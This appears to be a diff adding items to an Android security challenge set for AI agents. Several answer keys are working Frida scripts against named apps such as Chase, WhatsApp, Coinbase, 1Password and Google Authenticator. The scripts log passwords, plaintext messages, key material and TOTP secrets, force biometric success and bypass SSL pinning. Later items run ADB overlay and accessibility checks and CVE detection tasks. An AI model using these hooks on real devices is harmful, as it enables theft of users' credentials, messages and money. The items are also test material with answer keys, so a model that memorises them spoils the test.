+  hints:
+  - Use Module.findExportByName(null, 'open')
+  - Use Interceptor.attach with onEnter callback
+  - The first argument (args[0]) is the path string
+  kata_solution: "var openPtr = Module.findExportByName(null, 'open');\nInterceptor.attach(openPtr, {\n    onEnter: function(args)\
+    \ {\n        var path = Memory.readUtf8String(args[0]);\n        console.log(\"[OPEN] File: \" + path);\n    }\n});\n"
+  tags:
+  - frida
+  - native
+  - interceptor
+- id: green_persona_001
+  name: Banking App Login Hook
+  description: 'The target device has Chase Mobile installed (com.chase.sig.android).
+
+    Write a Frida script that hooks the login flow to capture credentials
+
+    when the user authenticates. Focus on intercepting the authentication
+
+    method that processes username and password.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: universal
+  persona_requirements:
+    required_apps:
+    - com.chase.sig.android
+  inputs:
+    target_package: com.chase.sig.android
+    device_context:
+      task: intercept banking credentials
+      target_app: Chase Mobile
+  validation:
+    type: regex_match
+    pattern: Java\.use.*implementation.*function
+  hints:
+  - First enumerate classes to find authentication-related methods
+  - Look for methods with 'login', 'auth', or 'credential' in the name
+  - Hook String parameters passed to authentication methods
+  - Use Java.choose() to find existing instances if needed
+  kata_solution: "Java.perform(function() {\n    // Generic pattern for credential interception\n    Java.enumerateLoadedClasses({\n\
+    \        onMatch: function(className) {\n            if (className.toLowerCase().includes(\"login\") ||\n            \
+    \    className.toLowerCase().includes(\"auth\")) {\n                console.log(\"[TARGET] Found class: \" + className);\n\
+    \            }\n        },\n        onComplete: function() {}\n    });\n\n    // Hook common authentication patterns\n\
+    \    try {\n        var LoginActivity = Java.use(\"com.chase.sig.android.activity.LoginActivity\");\n        LoginActivity.doLogin.implementation\
+    \ = function(username, password) {\n            console.log(\"[CAPTURED] Username: \" + username);\n            console.log(\"\
+    [CAPTURED] Password: \" + password);\n            return this.doLogin(username, password);\n        };\n    } catch(e)\
+    \ {\n        console.log(\"Searching for alternative auth methods...\");\n    }\n});\n"
+  tags:
+  - frida
+  - credential-theft
+  - banking
+  - persona-required
+- id: green_persona_002
+  name: WhatsApp Message Interception
+  description: 'The device has WhatsApp installed. Write a Frida script that hooks
+
+    WhatsApp''s message handling to intercept outgoing messages before
+
+    they''re encrypted and sent. Log the recipient and message content.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: universal
+  persona_requirements:
+    required_apps:
+    - com.whatsapp
+  inputs:
+    target_package: com.whatsapp
+    device_context:
+      task: intercept messaging content
+      target_app: WhatsApp
+  validation:
+    type: output_contains
+    expected: Java.perform
+  hints:
+  - WhatsApp uses end-to-end encryption, but messages exist in plaintext before encryption
+  - Look for message composition or send methods
+  - The Message class likely has getText() or similar methods
+  - Hook at the UI layer before encryption occurs
+  kata_solution: "Java.perform(function() {\n    // Hook message sending at UI layer\n    try {\n        var MessageSender\
+    \ = Java.use(\"com.whatsapp.messaging.MessageSender\");\n        MessageSender.sendTextMessage.implementation = function(recipient,\
+    \ message) {\n            console.log(\"[INTERCEPTED] To: \" + recipient);\n            console.log(\"[INTERCEPTED] Message:\
+    \ \" + message);\n            return this.sendTextMessage(recipient, message);\n        };\n    } catch(e) {\n       \
+    \ console.log(\"Trying alternative hook point...\");\n    }\n\n    // Alternative: Hook at EditText level\n    var EditText\
+    \ = Java.use(\"android.widget.EditText\");\n    EditText.getText.implementation = function() {\n        var text = this.getText();\n\
+    \        console.log(\"[INPUT] \" + text.toString());\n        return text;\n    };\n});\n"
+  tags:
+  - frida
+  - message-interception
+  - e2e-bypass
+  - persona-required
+- id: green_persona_003
+  name: Crypto Wallet Key Extraction
+  description: 'The device has Coinbase installed (com.coinbase.android). Write a
+
+    Frida script that attempts to extract wallet keys or seed phrases
+
+    by hooking cryptographic operations and key management classes.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: android_14
+  persona_requirements:
+    required_apps:
+    - com.coinbase.android
+  inputs:
+    target_package: com.coinbase.android
+    device_context:
+      task: extract cryptocurrency keys
+      target_app: Coinbase
+  validation:
+    type: regex_match
+    pattern: (SecretKey|PrivateKey|KeyPair|seed|mnemonic)
+  hints:
+  - Look for java.security.KeyStore operations
+  - Hook SecretKeySpec constructor to capture key material
+  - Seed phrases are often stored as String arrays
+  - Check for BIP39 mnemonic generation methods
+  kata_solution: "Java.perform(function() {\n    // Hook KeyStore operations\n    var KeyStore = Java.use(\"java.security.KeyStore\"\
+    );\n    KeyStore.getKey.implementation = function(alias, password) {\n        console.log(\"[KEYSTORE] Alias: \" + alias);\n\
+    \        var key = this.getKey(alias, password);\n        if (key != null) {\n            console.log(\"[KEYSTORE] Key\
+    \ retrieved!\");\n        }\n        return key;\n    };\n\n    // Hook SecretKeySpec for symmetric keys\n    var SecretKeySpec\
+    \ = Java.use(\"javax.crypto.spec.SecretKeySpec\");\n    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation\
+    \ = function(key, algo) {\n        console.log(\"[SECRET KEY] Algorithm: \" + algo);\n        console.log(\"[SECRET KEY]\
+    \ Key bytes: \" + bytesToHex(key));\n        return this.$init(key, algo);\n    };\n\n    function bytesToHex(bytes) {\n\
+    \        var hex = [];\n        for (var i = 0; i < bytes.length; i++) {\n            hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));\n\
+    \        }\n        return hex.join('');\n    }\n});\n"
+  tags:
+  - frida
+  - crypto-theft
+  - key-extraction
+  - persona-required
+- id: green_persona_004
+  name: Password Manager Vault Hook
+  description: 'The device has 1Password installed (com.onepassword.android). Write
+
+    a Frida script that hooks the vault decryption process to capture
+
+    the master password or extract decrypted credentials as they''re used.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: android_14
+  persona_requirements:
+    required_apps:
+    - com.onepassword.android
+  inputs:
+    target_package: com.onepassword.android
+    device_context:
+      task: extract password vault contents
+      target_app: 1Password
+  validation:
+    type: output_contains
+    expected: implementation
+  hints:
+  - Hook the unlock/decrypt method that takes the master password
+  - Look for Cipher.doFinal() calls during decryption
+  - Credential filling methods expose plaintext passwords
+  - The autofill service is a good hook point
+  kata_solution: "Java.perform(function() {\n    // Hook master password entry\n    var EditText = Java.use(\"android.widget.EditText\"\
+    );\n\n    // Hook Cipher operations\n    var Cipher = Java.use(\"javax.crypto.Cipher\");\n    Cipher.doFinal.overload('[B').implementation\
+    \ = function(input) {\n        var result = this.doFinal(input);\n        console.log(\"[CIPHER] Decrypted data length:\
+    \ \" + result.length);\n        try {\n            var str = Java.use(\"java.lang.String\").$new(result, \"UTF-8\");\n\
+    \            console.log(\"[DECRYPTED] \" + str.substring(0, Math.min(100, str.length())));\n        } catch(e) {}\n \
+    \       return result;\n    };\n\n    // Hook autofill credential retrieval\n    try {\n        var CredentialProvider\
+    \ = Java.use(\"com.onepassword.android.autofill.CredentialProvider\");\n        CredentialProvider.getCredential.implementation\
+    \ = function(id) {\n            var cred = this.getCredential(id);\n            console.log(\"[CREDENTIAL] ID: \" + id);\n\
+    \            console.log(\"[CREDENTIAL] Username: \" + cred.getUsername());\n            console.log(\"[CREDENTIAL] Password:\
+    \ \" + cred.getPassword());\n            return cred;\n        };\n    } catch(e) {}\n});\n"
+  tags:
+  - frida
+  - password-theft
+  - vault-bypass
+  - persona-required
+- id: green_persona_005
+  name: Authenticator TOTP Extraction
+  description: 'The device has Google Authenticator installed. Write a Frida script
+
+    that extracts the TOTP secrets used to generate 2FA codes, allowing
+
+    code generation without access to the app.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: universal
+  persona_requirements:
+    required_apps:
+    - com.google.android.apps.authenticator2
+  inputs:
+    target_package: com.google.android.apps.authenticator2
+    device_context:
+      task: extract 2FA secrets
+      target_app: Google Authenticator
+  validation:
+    type: regex_match
+    pattern: (TOTP|secret|generateCode|OTP)
+  hints:
+  - TOTP secrets are Base32-encoded strings
+  - Look for database operations storing account info
+  - The code generation method takes the secret as input
+  - SQLite database may contain the secrets
+  kata_solution: "Java.perform(function() {\n    // Hook TOTP generation\n    try {\n        var OtpProvider = Java.use(\"\
+    com.google.android.apps.authenticator2.otp.OtpProvider\");\n        OtpProvider.getNextCode.implementation = function(secret)\
+    \ {\n            console.log(\"[TOTP SECRET] \" + secret);\n            return this.getNextCode(secret);\n        };\n\
+    \    } catch(e) {}\n\n    // Hook database queries for stored secrets\n    var SQLiteDatabase = Java.use(\"android.database.sqlite.SQLiteDatabase\"\
+    );\n    SQLiteDatabase.rawQuery.implementation = function(sql, args) {\n        console.log(\"[SQL] \" + sql);\n     \
+    \   if (sql.toLowerCase().includes(\"accounts\") ||\n            sql.toLowerCase().includes(\"secret\")) {\n         \
+    \   console.log(\"[POTENTIAL SECRET QUERY]\");\n        }\n        return this.rawQuery(sql, args);\n    };\n});\n"
+  tags:
+  - frida
+  - 2fa-bypass
+  - totp-extraction
+  - persona-required
+- id: green_persona_006
+  name: Biometric Authentication Bypass
+  description: 'Many apps on the device use biometric authentication (fingerprint).
+
+    Write a Frida script that bypasses biometric checks by hooking the
+
+    BiometricPrompt callback and forcing successful authentication.
+
+    '
+  belt: green
+  difficulty: 4
+  script_type: frida
+  compatibility: universal
+  inputs:
+    device_context:
+      task: bypass biometric authentication
+  validation:
+    type: output_contains
+    expected: BiometricPrompt
+  hints:
+  - Hook BiometricPrompt.AuthenticationCallback
+  - Force onAuthenticationSucceeded to be called
+  - You may need to create a fake AuthenticationResult
+  - Some apps also check FingerprintManager (deprecated API)
+  kata_solution: "Java.perform(function() {\n    var BiometricPrompt = Java.use(\"android.hardware.biometrics.BiometricPrompt\"\
+    );\n    var AuthCallback = Java.use(\"android.hardware.biometrics.BiometricPrompt$AuthenticationCallback\");\n\n    AuthCallback.onAuthenticationFailed.implementation\
+    \ = function() {\n        console.log(\"[BIOMETRIC] Failed attempt intercepted\");\n        // Don't call original - suppress\
+    \ failure\n    };\n\n    // Force success on any authentication attempt\n    BiometricPrompt.authenticate.overload(\n\
+    \        'android.os.CancellationSignal',\n        'java.util.concurrent.Executor',\n        'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'\n\
+    \    ).implementation = function(cancel, executor, callback) {\n        console.log(\"[BIOMETRIC] Authentication requested\
+    \ - forcing success\");\n\n        // Create fake success result\n        var AuthResult = Java.use(\"android.hardware.biometrics.BiometricPrompt$AuthenticationResult\"\
+    );\n        var fakeResult = AuthResult.$new();\n\n        callback.onAuthenticationSucceeded(fakeResult);\n    };\n});\n"
+  tags:
+  - frida
+  - biometric-bypass
+  - authentication
+  - persona-required
+- id: green_persona_007
+  name: SSL Certificate Pinning Bypass
+  description: 'Banking and financial apps (Chase, Coinbase) use SSL pinning to
+
+    prevent traffic interception. Write a Frida script that bypasses
+
+    SSL pinning to allow MITM analysis of HTTPS traffic.
+
+    '
+  belt: green
+  difficulty: 4
+  script_type: frida
+  compatibility: universal
+  inputs:
+    device_context:
+      task: bypass SSL certificate pinning
+      target_apps:
+      - com.chase.sig.android
+      - com.coinbase.android
+  validation:
+    type: regex_match
+    pattern: (TrustManager|checkServerTrusted|SSLContext)
+  hints:
+  - Hook X509TrustManager.checkServerTrusted
+  - Make it accept any certificate chain
+  - Also hook OkHttp's CertificatePinner if used
+  - Some apps use custom pinning implementations
+  kata_solution: "Java.perform(function() {\n    // Bypass standard TrustManager\n    var TrustManager = Java.use(\"javax.net.ssl.X509TrustManager\"\
+    );\n    var SSLContext = Java.use(\"javax.net.ssl.SSLContext\");\n\n    var TrustManagerImpl = Java.registerClass({\n\
+    \        name: 'com.bypass.TrustManager',\n        implements: [TrustManager],\n        methods: {\n            checkClientTrusted:\
+    \ function(chain, authType) {},\n            checkServerTrusted: function(chain, authType) {\n                console.log(\"\
+    [SSL BYPASS] Accepting certificate for: \" + authType);\n            },\n            getAcceptedIssuers: function() {\
+    \ return []; }\n        }\n    });\n\n    // Install our TrustManager\n    var context = SSLContext.getInstance(\"TLS\"\
+    );\n    context.init(null, [TrustManagerImpl.$new()], null);\n    SSLContext.setDefault(context);\n\n    // Bypass OkHttp\
+    \ pinning\n    try {\n        var CertPinner = Java.use(\"okhttp3.CertificatePinner\");\n        CertPinner.check.overload('java.lang.String',\
+    \ 'java.util.List').implementation = function(hostname, certs) {\n            console.log(\"[OKHTTP] Bypassing pin for:\
+    \ \" + hostname);\n            return;\n        };\n    } catch(e) {}\n\n    console.log(\"[SSL] Pinning bypass installed\"\
+    );\n});\n"
+  tags:
+  - frida
+  - ssl-bypass
+  - mitm
+  - persona-required
+- id: green_persona_008
+  name: Chat App Database Extraction
+  description: 'WhatsApp and Telegram store messages in encrypted SQLite databases.
+
+    Write a Frida script that hooks database operations to extract
+
+    decrypted message content as the app reads them.
+
+    '
+  belt: green
+  difficulty: 5
+  script_type: frida
+  compatibility: universal
+  persona_requirements:
+    required_apps:
+    - com.whatsapp
+  inputs:
+    target_package: com.whatsapp
+    device_context:
+      task: extract messaging database content
+      target_app: WhatsApp
+  validation:
+    type: output_contains
+    expected: SQLite
+  hints:
+  - Hook SQLiteCursor to capture query results
+  - WhatsApp's msgstore.db contains all messages
+  - Messages are decrypted when loaded into memory
+  - Hook getString() on Cursor to capture text columns
+  kata_solution: "Java.perform(function() {\n    var Cursor = Java.use(\"android.database.Cursor\");\n    var SQLiteCursor\
+    \ = Java.use(\"android.database.sqlite.SQLiteCursor\");\n\n    // Hook getString to capture message content\n    Cursor.getString.implementation\
+    \ = function(columnIndex) {\n        var value = this.getString(columnIndex);\n        var colName = this.getColumnName(columnIndex);\n\
+    \n        // Look for message-related columns\n        if (colName && (colName.includes(\"data\") ||\n               \
+    \        colName.includes(\"text\") ||\n                       colName.includes(\"body\"))) {\n            console.log(\"\
+    [DB] Column: \" + colName + \" = \" + value);\n        }\n        return value;\n    };\n\n    // Hook rawQuery to see\
+    \ what's being queried\n    var SQLiteDatabase = Java.use(\"android.database.sqlite.SQLiteDatabase\");\n    SQLiteDatabase.rawQuery.implementation\
+    \ = function(sql, args) {\n        if (sql.toLowerCase().includes(\"message\")) {\n            console.log(\"[SQL] Message\
+    \ query: \" + sql);\n        }\n        return this.rawQuery(sql, args);\n    };\n});\n"
+  tags:
+  - frida
+  - database-extraction
+  - message-theft
+  - persona-required
+- id: green_persona_009
+  name: Notification Content Theft
+  description: 'Many sensitive items arrive via notifications (2FA codes, bank alerts).
+
+    Write a Frida script that intercepts all notifications as they''re
+
+    posted, extracting the title and content text.
+
+    '
+  belt: green
+  difficulty: 3
+  script_type: frida
+  compatibility: universal
+  inputs:
+    device_context:
+      task: intercept notification content
+  validation:
+    type: output_contains
+    expected: NotificationManager
+  hints:
+  - Hook NotificationManager.notify()
+  - Extract text from Notification.extras Bundle
+  - 'Keys: EXTRA_TITLE, EXTRA_TEXT, EXTRA_BIG_TEXT'
+  - 2FA codes often come as high-priority notifications
+  kata_solution: "Java.perform(function() {\n    var NotificationManager = Java.use(\"android.app.NotificationManager\");\n\
+    \    var Notification = Java.use(\"android.app.Notification\");\n\n    NotificationManager.notify.overload('int', 'android.app.Notification').implementation\
+    \ = function(id, notification) {\n        console.log(\"[NOTIFICATION] ID: \" + id);\n\n        var extras = notification.extras.value;\n\
+    \        var title = extras.getString(\"android.title\");\n        var text = extras.getString(\"android.text\");\n  \
+    \      var bigText = extras.getString(\"android.bigText\");\n\n        console.log(\"[NOTIFICATION] Title: \" + title);\n\
+    \        console.log(\"[NOTIFICATION] Text: \" + text);\n        if (bigText) console.log(\"[NOTIFICATION] BigText: \"\
+    \ + bigText);\n\n        // Check for 2FA codes\n        var fullText = (text || \"\") + (bigText || \"\");\n        if\
+    \ (fullText.match(/\\d{6}/) || fullText.toLowerCase().includes(\"code\")) {\n            console.log(\"[2FA DETECTED]\
+    \ Potential verification code!\");\n        }\n\n        return this.notify(id, notification);\n    };\n});\n"
+  tags:
+  - frida
+  - notification-interception
+  - 2fa-theft
+  - persona-required
+- id: green_persona_010
+  name: Real-time Clipboard Monitoring
+  description: 'Users often copy sensitive data (passwords, crypto addresses).
+
+    Write a Frida script that monitors the system clipboard and logs
+
+    everything that''s copied, looking for high-value data patterns.
+
+    '
+  belt: green
+  difficulty: 3
+  script_type: frida
+  compatibility: universal
+  inputs:
+    device_context:
+      task: monitor clipboard for sensitive data
+  validation:
+    type: output_contains
+    expected: ClipboardManager
+  hints:
+  - Hook ClipboardManager.setPrimaryClip()
+  - Extract text from ClipData items
+  - 'Look for patterns: crypto addresses, passwords, SSNs'
+  - Also hook getText() for reading clipboard
+  kata_solution: "Java.perform(function() {\n    var ClipboardManager = Java.use(\"android.content.ClipboardManager\");\n\
+    \    var ClipData = Java.use(\"android.content.ClipData\");\n\n    // Hook clipboard write\n    ClipboardManager.setPrimaryClip.implementation\
+    \ = function(clip) {\n        console.log(\"[CLIPBOARD] New content copied\");\n\n        for (var i = 0; i < clip.getItemCount();\
+    \ i++) {\n            var item = clip.getItemAt(i);\n            var text = item.getText();\n            if (text) {\n\
+    \                console.log(\"[CLIPBOARD] Content: \" + text);\n\n                // Pattern matching for sensitive data\n\
+    \                var str = text.toString();\n                if (str.match(/^0x[a-fA-F0-9]{40}$/)) {\n               \
+    \     console.log(\"[ALERT] Ethereum address detected!\");\n                }\n                if (str.match(/^\\d{3}-\\\
+    d{2}-\\d{4}$/)) {\n                    console.log(\"[ALERT] SSN pattern detected!\");\n                }\n          \
+    \      if (str.match(/^[A-Za-z0-9+/]{20,}={0,2}$/)) {\n                    console.log(\"[ALERT] Possible API key/token!\"\
+    );\n                }\n            }\n        }\n\n        return this.setPrimaryClip(clip);\n    };\n});\n"
+  tags:
+  - frida
+  - clipboard-monitor
+  - data-theft
+  - persona-required
+- id: green_overlay_001
+  name: Overlay Attack - Screen Hijacking
+  description: 'Demonstrate an overlay attack that can capture user input by placing
+
+    a transparent or deceptive window over legitimate app UI.
+
+
+    OBJECTIVE:
+
+    1. Check overlay permission status on target device
+
+    2. Enumerate apps with SYSTEM_ALERT_WINDOW permission
+
+    3. Demonstrate overlay attack surface via ADB commands
+
+    4. Simulate the attack flow for credential capture
+
+
+    This demonstrates how malicious apps can steal credentials by
+
+    overlaying fake login screens on banking/financial apps.
+
+    '
+  belt: green
+  difficulty: 4
+  script_type: adb
+  compatibility: universal
+  exploitation_complexity:
+    rating: 3
+    rationale: Well-documented attack vector, requires understanding Android window system
+    required_skills:
+    - android_permissions
+    - window_manager
+    - adb_shell_commands
+    steps_required: 4
+    tools_needed:
+    - adb
+  inputs:
+    device_context:
+      task: demonstrate overlay attack surface
+      target_apps:
+      - com.chase.sig.android
+      - com.coinbase.android
+  validation:
+    type: output_contains
+    expected: SYSTEM_ALERT_WINDOW
+  hints:
+  - 'Check permission: adb shell appops get <pkg> SYSTEM_ALERT_WINDOW'
+  - 'List all apps with overlay: dumpsys window | grep mOverlayWindow'
+  - Overlay permission is required for draw-over-apps
+  - Modern Android (10+) restricts overlay on sensitive apps
+  kata_solution: '# Check for apps with overlay permission
+
+    adb shell appops query-op SYSTEM_ALERT_WINDOW allow
+
+
+    # Check specific security-sensitive app
+
+    adb shell appops get com.android.settings SYSTEM_ALERT_WINDOW
+
+
+    # List window overlay state
+
+    adb shell dumpsys window windows | grep -E "mOverlay|SYSTEM_ALERT"
+
+
+    echo "SYSTEM_ALERT_WINDOW analysis complete"
+
+    '
+  tags:
+  - overlay
+  - tapjacking
+  - credential-theft
+  - attack-surface
+- id: green_clipper_002
+  name: Cryptocurrency Address Clipper
+  description: 'Write a Frida script that monitors the clipboard for cryptocurrency
+
+    wallet addresses and demonstrates how a clipper malware could
+
+    replace them with attacker-controlled addresses.
+
+
+    OBJECTIVE:
+
+    1. Hook ClipboardManager to monitor clipboard changes
+
+    2. Detect cryptocurrency address patterns (ETH, BTC)
+
+    3. Log detected addresses
+
+    4. Demonstrate replacement capability (logging only, don''t modify)
+
+
+    Pattern matching:
+
+    - ETH: 0x followed by 40 hex characters
+
+    - BTC: 1, 3, or bc1 prefix with 25-34 characters
+
+    '
+  belt: green
+  difficulty: 4
+  script_type: frida
+  compatibility: universal
+  exploitation_complexity:
+    rating: 3
+    rationale: Standard clipboard hooking with regex pattern matching
+    required_skills:
+    - frida_java_hooking
+    - clipboard_api
+    - regex_patterns
+    steps_required: 4
+    tools_needed:
+    - frida
+  inputs:
+    device_context:
+      task: implement clipboard monitoring for crypto addresses
+  validation:
+    type: regex_match
+    pattern: (ClipboardManager|setPrimaryClip|0x[a-fA-F0-9]|bc1)
+  hints:
+  - Hook android.content.ClipboardManager
+  - Both setPrimaryClip and getPrimaryClip are useful
+  - 'Use regex to match ETH addresses: /^0x[a-fA-F0-9]{40}$/'
+  - BTC addresses start with 1, 3, or bc1
+  kata_solution: "Java.perform(function() {\n    var ClipboardManager = Java.use(\"android.content.ClipboardManager\");\n\n\
+    \    ClipboardManager.setPrimaryClip.implementation = function(clip) {\n        var text = clip.getItemAt(0).getText();\n\
+    \        if (text != null) {\n            var str = text.toString();\n            console.log(\"[CLIPBOARD] Content: \"\
+    \ + str);\n\n            // Check for Ethereum address\n            if (str.match(/^0x[a-fA-F0-9]{40}$/)) {\n        \
+    \        console.log(\"[CLIPPER] ETH address detected!\");\n                console.log(\"[CLIPPER] Would replace with\
+    \ attacker wallet\");\n            }\n\n            // Check for Bitcoin address\n            if (str.match(/^(1|3|bc1)[a-zA-Z0-9]{25,39}$/))\
+    \ {\n                console.log(\"[CLIPPER] BTC address detected!\");\n                console.log(\"[CLIPPER] Would\
+    \ replace with attacker wallet\");\n            }\n        }\n        return this.setPrimaryClip(clip);\n    };\n\n  \
+    \  console.log(\"[+] Crypto clipper monitoring active\");\n});\n"
+  tags:
+  - frida
+  - clipper
+  - crypto-theft
+  - clipboard
+- id: green_accessibility_001
+  name: Accessibility Service Attack Surface
+  description: 'Analyze the attack surface of Android accessibility services.
+
+    Accessibility services are frequently abused by malware to:
+
+    - Read screen content
+
+    - Perform automated clicks
+
+    - Capture credentials
+
+    - Bypass security prompts
+
+
+    OBJECTIVE:
+
+    1. List enabled accessibility services
+
+    2. Check accessibility service permissions
+
+    3. Demonstrate how accessibility can read screen content
+
+    4. Document the attack vectors
+
+    '
+  belt: green
+  difficulty: 3
+  script_type: adb
+  compatibility: universal
+  exploitation_complexity:
+    rating: 2
+    rationale: Well-documented abuse vector with ADB enumeration
+    required_skills:
+    - adb_commands
+    - accessibility_api
+    - android_permissions
+    steps_required: 3
+    tools_needed:
+    - adb
+  inputs:
+    device_context:
+      task: analyze accessibility service attack surface
+  validation:
+    type: output_contains
+    expected: accessibility
+  hints:
+  - 'Settings: secure enabled_accessibility_services'
+  - Use dumpsys accessibility for detailed info
+  - Check which apps have AccessibilityService declared
+  - Accessibility can see all UI content including passwords
+  kata_solution: "# List enabled accessibility services\nadb shell settings get secure enabled_accessibility_services\n\n\
+    # Get detailed accessibility state\nadb shell dumpsys accessibility\n\n# Find apps with accessibility service declared\n\
+    adb shell pm list packages -f | while read pkg; do\n  name=$(echo $pkg | cut -d'=' -f2)\n  adb shell dumpsys package $name\
+    \ | grep -q \"android.accessibilityservice\" && echo \"ACCESSIBILITY: $name\"\ndone\n\necho \"[+] Accessibility analysis\
+    \ complete\"\n"
+  tags:
+  - accessibility
+  - attack-surface
+  - screen-reader
+  - automation
+- id: nvd_cve_2024_0014
+  name: CVE-2024-0014 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0014
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-693
+
+
+    In startInstall of UpdateFetcher.java, there is a possible way to trigger a malicious config update due to a logic error.
+    This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not
+    needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0014
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-693
+  expected_output:
+    must_contain:
+    - CVE-2024-0014
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0014
+  - cwe-693
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0015
+  name: CVE-2024-0015 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0015
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-280
+
+
+    In convertToComponentName of DreamService.java, there is a possible way to launch arbitrary protected activities due to
+    intent redirection. This could lead to local escalation of privilege with User execution privileges needed. User interaction
+    is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0015
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-280
+  expected_output:
+    must_contain:
+    - CVE-2024-0015
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0015
+  - cwe-280
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0016
+  name: CVE-2024-0016 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0016
+
+    CVSS: 5.3 (MEDIUM)
+
+    Attack Vector: NETWORK
+
+    CWE: CWE-125, CWE-125
+
+
+    In multiple locations, there is a possible out of bounds read due to a missing bounds check. This could lead to paired
+    device information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0016
+    cvss_score: 5.3
+    severity: MEDIUM
+    attack_vector: NETWORK
+    cwes:
+    - CWE-125
+    - CWE-125
+  expected_output:
+    must_contain:
+    - CVE-2024-0016
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0016
+  - cwe-125
+  - cwe-125
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0017
+  name: CVE-2024-0017 - MEDIUM Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0017
+
+    CVSS: 5.5 (MEDIUM)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-863, CWE-863
+
+
+    In shouldUseNoOpLocation of CameraActivity.java, there is a possible confused deputy due to a permissions bypass. This
+    could lead to local information disclosure with no additional execution privileges needed. User interaction is needed
+    for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 3
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0017
+    cvss_score: 5.5
+    severity: MEDIUM
+    attack_vector: LOCAL
+    cwes:
+    - CWE-863
+    - CWE-863
+  expected_output:
+    must_contain:
+    - CVE-2024-0017
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
+    report_quality: 15
+  tags:
+  - nvd-generated
+  - android-2024
+  - cve-2024-0017
+  - cwe-863
+  - cwe-863
+  source: NVD API - Android Security Bulletin 2024
+  published: '2024-02-16'
+- id: nvd_cve_2024_0018
+  name: CVE-2024-0018 - HIGH Vulnerability Analysis
+  description: 'Real-world CVE from Android Security Bulletin (2024-02-16)
+
+
+    CVE: CVE-2024-0018
+
+    CVSS: 7.8 (HIGH)
+
+    Attack Vector: LOCAL
+
+    CWE: CWE-787, CWE-122
+
+
+    In convertYUV420Planar16ToY410 of ColorConverter.cpp, there is a possible out of bounds write due to a heap buffer overflow.
+    This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not
+    needed for exploitation.
+
+
+    This is a GREEN BELT challenge focusing on:
+
+    - Android Framework vulnerabilities
+
+    - Permission and IPC issues
+
+    - Content Provider security
+
+    - Intent handling flaws
+
+
+    OBJECTIVE: Analyze the device to determine vulnerability status and identify affected components.'
+  difficulty: 4
+  script_type: adb
+  execution_mode: detection_analysis
+  compatibility: universal
+  inputs:
+    cve_id: CVE-2024-0018
+    cvss_score: 7.8
+    severity: HIGH
+    attack_vector: LOCAL
+    cwes:
+    - CWE-787
+    - CWE-122
+  expected_output:
+    must_contain:
+    - CVE-2024-0018
+  scoring:
+    cve_identified: 15
+    patch_level_checked: 20
+    component_analysis: 25
+    vulnerability_assessment: 25
